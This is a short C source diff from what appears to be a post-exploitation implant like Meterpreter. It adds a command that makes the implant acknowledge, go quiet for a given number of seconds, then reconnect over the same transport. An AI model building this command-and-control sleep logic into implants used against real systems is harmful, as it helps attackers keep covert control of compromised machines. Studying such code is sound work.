@@ -302,6 +302,23 @@ DWORD remote_request_core_transport_add(Remote* remote, Packet* packet)
 	return result;
 }
 
+BOOL remote_request_core_transport_sleep(Remote* remote, Packet* packet, DWORD* result)
+{
+	// we'll reuse the comm timeout TLV for this purpose
+	DWORD seconds = packet_get_tlv_value_uint(packet, TLV_TYPE_TRANS_COMM_TIMEOUT);
+
+	dprintf("[DISPATCH] request received to sleep for %u seconds", seconds);
+
+	// to sleep, we simply jump to the same transport, with a delay
+	remote->next_transport_wait = seconds;
+	remote->next_transport = remote->transport;
+
+	packet_transmit_empty_response(remote, packet, ERROR_SUCCESS);
+
+	// exit out of the dispatch loop
+	return FALSE;
+}
+
 BOOL remote_request_core_transport_change(Remote* remote, Packet* packet, DWORD* result)
 {
 	Transport* transport = NULL;
